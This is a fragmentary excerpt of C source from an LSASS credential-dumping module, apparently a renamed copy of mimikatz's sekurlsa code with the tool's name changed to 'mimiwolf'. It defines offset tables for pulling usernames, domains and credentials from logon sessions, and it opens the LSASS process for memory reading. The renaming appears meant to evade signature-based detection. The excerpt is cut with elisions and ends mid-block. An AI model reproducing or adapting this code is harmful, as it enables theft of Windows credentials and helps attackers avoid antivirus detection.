...
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	...
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_mimiwolf, LogonServer)},
...
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	...
	DWORD processRights = PROCESS_VM_READ | ((mimiwolf_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;
	PBYTE pSk;
			...
			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
			{
				...
				else
				{
					...
					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
						PRINT_ERROR(mimiwolf L" " mimiwolf_ARCH L" cannot access x64 process\n");
					else
				#endif
					{						
						cLsass.osContext.MajorVersion = mimiwolf_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = mimiwolf_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = mimiwolf_NT_BUILD_NUMBER;
					}
				}
...
#pragma warning(pop)
	...
	{
		if(mimiwolf_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
